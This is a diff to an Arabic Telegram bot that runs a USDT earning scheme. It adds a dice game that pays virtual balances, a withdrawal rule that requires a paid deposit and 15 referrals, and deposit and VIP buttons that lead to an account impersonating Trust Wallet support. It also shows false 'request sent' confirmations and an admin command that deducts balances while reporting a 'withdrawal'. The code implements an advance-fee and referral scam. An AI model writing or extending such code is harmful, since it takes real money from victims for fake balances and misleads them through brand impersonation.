@@ -61,7 +61,8 @@ def init_database():
                 last_mining_date TEXT,
                 withdrawal_address TEXT,
                 games_played_today INTEGER DEFAULT 0,
-                last_reset_date TEXT
+                last_reset_date TEXT,
+                has_deposit INTEGER DEFAULT 0
             )
         """)
         conn.commit()
@@ -98,7 +99,8 @@ def get_user(user_id):
                     'last_mining_date': user_data[12],
                     'withdrawal_address': user_data[13],
                     'games_played_today': user_data[14],
-                    'last_reset_date': user_data[15]
+                    'last_reset_date': user_data[15],
+                    'has_deposit': user_data[16]
                 }
                 conn.close()
                 return user_dict
@@ -120,10 +122,11 @@ def get_user(user_id):
                     'last_mining_date': None,
                     'withdrawal_address': "",
                     'games_played_today': 0,
-                    'last_reset_date': datetime.now().strftime('%Y-%m-%d')
+                    'last_reset_date': datetime.now().strftime('%Y-%m-%d'),
+                    'has_deposit': 0
                 }
                 cursor.execute("""
-                    INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                    INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 """, (
                     new_user['user_id'], new_user['username'], new_user['first_name'],
                     new_user['balance'], new_user['referral_count'], new_user['new_referrals'],
@@ -131,7 +134,7 @@ def get_user(user_id):
                     new_user['total_deposits'], new_user['registration_date'],
                     new_user['last_activity'], new_user['last_mining_date'],
                     new_user['withdrawal_address'], new_user['games_played_today'],
-                    new_user['last_reset_date']
+                    new_user['last_reset_date'], new_user['has_deposit']
                 ))
                 conn.commit()
                 conn.close()
@@ -169,6 +172,16 @@ def get_remaining_attempts(user):
     total_attempts = base_attempts + extra_attempts
     remaining = total_attempts - used_attempts
     return max(0, remaining), total_attempts, extra_attempts
+
+def can_withdraw(user):
+    """التحقق من إمكانية السحب"""
+    has_10_days = True  # يمكن إضافة شرط الأيام لاحقاً
+    has_150_balance = user['balance'] >= 150
+    has_address = bool(user.get('withdrawal_address', ''))
+    has_15_refs = user.get('new_referrals', 0) >= 15
+    has_deposit = user.get('has_deposit', 0) == 1
+    
+    return has_deposit and has_150_balance and has_address and has_15_refs
 
 # 🎯 الواجهة الرئيسية المحسنة
 @bot.message_handler(commands=['start', 'profile', 'الملف'])
@@ -211,6 +224,7 @@ def handle_start(message):
             InlineKeyboardButton("💰 السحب", callback_data="withdraw")
         )
         keyboard.add(
+            InlineKeyboardButton("💳 الإيداع", callback_data="deposit"),
             InlineKeyboardButton("🆘 الدعم الفني", url="https://t.me/Trust_wallet_Support_4")
         )
         
@@ -320,6 +334,67 @@ def play_slot(call):
     except Exception as e:
         print(f"❌ خطأ في play_slot: {e}")
 
+# 🎲 لعبة النرد - جديدة
+@bot.callback_query_handler(func=lambda call: call.data == "game_dice")
+def play_dice(call):
+    try:
+        user = get_user(call.from_user.id)
+        remaining_attempts, total_attempts, _ = get_remaining_attempts(user)
+        
+        if remaining_attempts <= 0:
+            bot.answer_callback_query(call.id, "❌ لا توجد محاولات متبقية اليوم!", show_alert=True)
+            return
+        
+        update_user(call.from_user.id, games_played_today=user.get('games_played_today', 0) + 1)
+        
+        dice1 = random.randint(1, 6)
+        dice2 = random.randint(1, 6)
+        total = dice1 + dice2
+        
+        if total == 7:
+            win_amount = 2.5
+            win_text = "🎉 ربح كبير! (رقم الحظ)"
+        elif total >= 10:
+            win_amount = 1.5
+            win_text = "👍 ربح جيد!"
+        elif total <= 4:
+            win_amount = 1.0
+            win_text = "👌 ربح صغير"
+        else:
+            win_amount = 0
+            win_text = "😞 حاول مرة أخرى"
+        
+        new_balance = user['balance'] + win_amount
+        new_earnings = user['total_earnings'] + win_amount
+        update_user(call.from_user.id, balance=new_balance, total_earnings=new_earnings)
+        
+        user = get_user(call.from_user.id)
+        remaining_attempts, total_attempts, _ = get_remaining_attempts(user)
+        
+        game_result = f"""🎲 **لعبة النرد**
+
+🎲 **النرد:** {dice1} + {dice2} = {total}
+
+{win_text}
+💰 **الربح:** {win_amount:.2f} USDT
+💵 **الرصيد الجديد:** {new_balance:.2f} USDT
+
+🎯 **المحاولات المتبقية:** {remaining_attempts}/{total_attempts}"""
+        
+        keyboard = InlineKeyboardMarkup()
+        keyboard.add(InlineKeyboardButton("🎲 العب مرة أخرى", callback_data="game_dice"))
+        keyboard.add(InlineKeyboardButton("🔙 رجوع للألعاب", callback_data="games"))
+        
+        bot.edit_message_text(
+            game_result, 
+            call.message.chat.id, 
+            call.message.message_id, 
+            reply_markup=keyboard,
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        print(f"❌ خطأ في play_dice: {e}")
+
 # 💎 خدمات VIP
 @bot.callback_query_handler(func=lambda call: call.data == "vip_services")
 def show_vip_services(call):
@@ -345,9 +420,9 @@ def show_vip_services(call):
         
         keyboard = InlineKeyboardMarkup(row_width=1)
         keyboard.add(
-            InlineKeyboardButton("🟢 شراء برونز VIP - 5 USDT", callback_data="buy_bronze"),
-            InlineKeyboardButton("🔵 شراء سيلفر VIP - 10 USDT", callback_data="buy_silver"),
-            InlineKeyboardButton("🟡 شراء جولد VIP - 20 USDT", callback_data="buy_gold"),
+            InlineKeyboardButton("🟢 شراء برونز VIP - 5 USDT", url="https://t.me/Trust_wallet_Support_4"),
+            InlineKeyboardButton("🔵 شراء سيلفر VIP - 10 USDT", url="https://t.me/Trust_wallet_Support_4"),
+            InlineKeyboardButton("🟡 شراء جولد VIP - 20 USDT", url="https://t.me/Trust_wallet_Support_4"),
             InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile")
         )
         
@@ -360,6 +435,55 @@ def show_vip_services(call):
         )
     except Exception as e:
         print(f"❌ خطأ في show_vip_services: {e}")
+
+# 💳 زر الإيداع الجديد
+@bot.callback_query_handler(func=lambda call: call.data == "deposit")
+def handle_deposit(call):
+    try:
+        deposit_text = """💳 **نظام الإيداع**
+
+📊 **لماذا تحتاج للإيداع؟**
+• تفعيل خاصية السحب
+• زيادة فرص الربح
+• وصول أسرع للأرباح
+
+💰 **الحد الأدنى للإيداع:** 10 USDT
+
+🚀 **لإجراء الإيداع:**
+1. اضغط على زر 'طلب إيداع' أدناه
+2. سيتم تحويلك للمسؤول
+3. أرسل مبلغ الإيداع
+4. سيتم تفعيل حسابك خلال 24 ساعة
+
+✅ **بعد الإيداع ستصبح مؤهلاً ل:**
+• سحب الأرباح
+• مزايا إضافية
+• دعم متميز"""
+        
+        keyboard = InlineKeyboardMarkup()
+        keyboard.add(InlineKeyboardButton("📥 طلب إيداع", url="https://t.me/Trust_wallet_Support_4"))
+        keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
+        
+        bot.edit_message_text(
+            deposit_text,
+            call.message.chat.id,
+            call.message.message_id,
+            reply_markup=keyboard,
+            parse_mode='Markdown'
+        )
+        
+        # إرسال رسالة تأكيد للمستخدم
+        bot.send_message(
+            call.from_user.id,
+            "✅ **تم إرسال طلب الإيداع بنجاح!**\n\n"
+            "📞 **سيقوم المسؤول بالتواصل معك خلال 24 ساعة**\n"
+            "💰 **الحد الأدنى للإيداع: 10 USDT**\n\n"
+            "شكراً لثقتك بنا! 🌟",
+            parse_mode='Markdown'
+        )
+        
+    except Exception as e:
+        print(f"❌ خطأ في handle_deposit: {e}")
 
 # 🎯 رابط الاحالات
 @bot.callback_query_handler(func=lambda call: call.data == "referral")
@@ -401,34 +525,46 @@ def handle_withdraw(call):
     try:
         user = get_user(call.from_user.id)
         
-        withdraw_text = f"""💰 **نظام السحب**
+        if not user.get('has_deposit', 0):
+            withdraw_text = """❌ **غير مؤهل للسحب**
+
+💰 **لتصبح مؤهلاً للسحب، تحتاج إلى:**
+
+1. **إيداع أولي:** 10 USDT كحد أدنى
+2. **رصيد في الحساب:** 150 USDT كحد أدنى للسحب  
+3. **إحالات جديدة:** 15 إحالة على الأقل
+4. **عنوان محفظة:** USDT (TRC20)
+
+💳 **لإجراء الإيداع، اضغط على زر 'الإيداع' في القائمة الرئيسية**"""
+            
+            keyboard = InlineKeyboardMarkup()
+            keyboard.add(InlineKeyboardButton("💳 الانتقال للإيداع", callback_data="deposit"))
+            keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
+        else:
+            withdraw_text = f"""💰 **نظام السحب**
+
+✅ **أنت مؤهل للسحب!**
 
 💰 **الرصيد المتاح:** {user['balance']:.1f} USDT
 💳 **عنوان المحفظة:** {user['withdrawal_address'] or 'غير محدد'}
 
 📊 **شروط السحب:**
-• الحد الأدنى: 150 USDT
-• 10 أيام تسجيل
-• 15 إحالة جديدة
+• ✓ إيداع مفعل
+• {'✓' if user['balance'] >= 150 else '✗'} رصيد 150 USDT ({user['balance']:.1f}/150)
+• {'✓' if user['new_referrals'] >= 15 else '✗'} 15 إحالة جديدة ({user['new_referrals']}/15)
+• {'✓' if user['withdrawal_address'] else '✗'} عنوان محفظة محدد
 
 اختر مبلغ السحب:"""
-        
-        keyboard = InlineKeyboardMarkup(row_width=2)
-        keyboard.add(
-            InlineKeyboardButton("💰 سحب 150 USDT", callback_data="withdraw_150"),
-            InlineKeyboardButton("💰 سحب 300 USDT", callback_data="withdraw_300"),
-            InlineKeyboardButton("💰 سحب 500 USDT", callback_data="withdraw_500"),
-            InlineKeyboardButton("💰 سحب كل الرصيد", callback_data="withdraw_all")
-        )
-        keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
-        
-        if not user.get('withdrawal_address'):
-            msg = bot.send_message(
-                call.message.chat.id,
-                "💰 **نظام السحب**\n\n📝 الرجاء إرسال عنوان محفظة USDT (TRC20):"
-            )
-            bot.register_next_step_handler(msg, process_withdrawal_address, user)
-            return
+            
+            keyboard = InlineKeyboardMarkup(row_width=2)
+            if user['balance'] >= 150:
+                keyboard.add(
+                    InlineKeyboardButton("💰 سحب 150 USDT", callback_data="withdraw_150"),
+                    InlineKeyboardButton("💰 سحب 300 USDT", callback_data="withdraw_300"),
+                    InlineKeyboardButton("💰 سحب 500 USDT", callback_data="withdraw_500"),
+                    InlineKeyboardButton("💰 سحب كل الرصيد", callback_data="withdraw_all")
+                )
+            keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
         
         bot.edit_message_text(
             withdraw_text,
@@ -486,6 +622,7 @@ def back_to_profile(call):
             InlineKeyboardButton("💰 السحب", callback_data="withdraw")
         )
         keyboard.add(
+            InlineKeyboardButton("💳 الإيداع", callback_data="deposit"),
             InlineKeyboardButton("🆘 الدعم الفني", url="https://t.me/Trust_wallet_Support_4")
         )
         
@@ -499,7 +636,7 @@ def back_to_profile(call):
     except Exception as e:
         print(f"❌ خطأ في back_to_profile: {e}")
 
-# 🛠️ الأوامر الإدارية (نفسها شغالة)
+# 🛠️ الأوامر الإدارية المحدثة
 @bot.message_handler(commands=['quickadd'])
 def handle_quickadd(message):
     if not is_admin(message.from_user.id):
@@ -561,7 +698,100 @@ def handle_setbalance(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"❌ خطأ: {e}")
 
-# ... باقي الأوامر الإدارية نفسها
+# أمر تفعيل الإيداع
+@bot.message_handler(commands=['activate_deposit'])
+def handle_activate_deposit(message):
+    if not is_admin(message.from_user.id):
+        bot.send_message(message.chat.id, "❌ ليس لديك صلاحية!")
+        return
+    
+    try:
+        parts = message.text.split()
+        if len(parts) != 2:
+            bot.send_message(message.chat.id, "📝 usage: /activate_deposit [user_id]")
+            return
+        
+        target_user_id = parts[1]
+        
+        user = get_user(target_user_id)
+        if not user:
+            bot.send_message(message.chat.id, "❌ المستخدم غير موجود!")
+            return
+        
+        success = update_user(target_user_id, has_deposit=1)
+        
+        if success:
+            bot.send_message(message.chat.id, f"✅ تم تفعيل الإيداع للمستخدم {target_user_id}")
+            # إرسال إشعار للمستخدم
+            try:
+                bot.send_message(
+                    target_user_id,
+                    "🎉 **تم تفعيل إيداعك بنجاح!**\n\n"
+                    "✅ **أنت الآن مؤهل ل:**\n"
+                    "• سحب الأرباح\n"
+                    "• مزايا إضافية\n"
+                    "• دعم متميز\n\n"
+                    "شكراً لثقتك بنا! 🌟",
+                    parse_mode='Markdown'
+                )
+            except:
+                pass
+        else:
+            bot.send_message(message.chat.id, "❌ فشل في تفعيل الإيداع!")
+            
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ خطأ: {e}")
+
+# أمر سحب الرصيد
+@bot.message_handler(commands=['withdraw_balance'])
+def handle_withdraw_balance(message):
+    if not is_admin(message.from_user.id):
+        bot.send_message(message.chat.id, "❌ ليس لديك صلاحية!")
+        return
+    
+    try:
+        parts = message.text.split()
+        if len(parts) != 3:
+            bot.send_message(message.chat.id, "📝 usage: /withdraw_balance [user_id] [amount]")
+            return
+        
+        target_user_id = parts[1]
+        amount = float(parts[2])
+        
+        user = get_user(target_user_id)
+        if not user:
+            bot.send_message(message.chat.id, "❌ المستخدم غير موجود!")
+            return
+        
+        if user['balance'] < amount:
+            bot.send_message(message.chat.id, f"❌ رصيد المستخدم غير كافي! الرصيد: {user['balance']:.1f} USDT")
+            return
+        
+        new_balance = user['balance'] - amount
+        success = update_user(target_user_id, balance=new_balance)
+        
+        if success:
+            bot.send_message(message.chat.id, f"✅ تم سحب {amount} USDT من المستخدم {target_user_id}")
+            # إرسال إشعار للمستخدم
+            try:
+                bot.send_message(
+                    target_user_id,
+                    f"💸 **تم سحب رصيد بنجاح!**\n\n"
+                    f"💰 **المبلغ المسحوب:** {amount:.1f} USDT\n"
+                    f"💵 **الرصيد المتبقي:** {new_balance:.1f} USDT\n"
+                    f"📅 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                    f"شكراً لاستخدامك خدماتنا! 🌟",
+                    parse_mode='Markdown'
+                )
+            except:
+                pass
+        else:
+            bot.send_message(message.chat.id, "❌ فشل في سحب الرصيد!")
+            
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ خطأ: {e}")
+
+# ... باقي الأوامر الإدارية
 
 # 🔧 نظام التشغيل
 app = Flask(__name__)
